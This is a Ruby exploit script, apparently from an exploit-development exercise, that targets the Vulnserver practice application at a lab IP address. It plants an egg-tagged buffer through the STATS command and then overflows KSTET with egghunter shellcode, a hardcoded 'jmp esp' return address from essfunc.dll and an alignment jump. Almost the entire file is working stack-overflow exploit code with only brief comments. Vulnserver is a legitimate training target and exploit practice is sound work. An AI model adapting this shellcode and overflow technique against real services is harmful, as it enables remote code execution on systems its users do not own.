#!/usr/bin/ruby

require 'socket'

target = '192.168.1.121'
port = 9999

buffer = "D" * 1000

s = TCPSocket.open(target, port)
s.write("STATS WereWere" + buffer)
s.close()

# EIP offset at 66
first_stage = "\x90" * 10;

# egghunter egg Were
first_stage += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
first_stage += "\xef\xb8\x57\x65\x72\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

first_stage += "\x90" * (66 - first_stage.length)

# 0x625011af : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
first_stage += "\xaf\x11\x50\x62"
# aligning eax and jmp eax
first_stage += "\x83\xc0\x0a\xff\xe0"
first_stage += "C" * (1000 - first_stage.length)

s = TCPSocket.open(target, port)
s.puts("KSTET /.:/" + first_stage)
s.close()
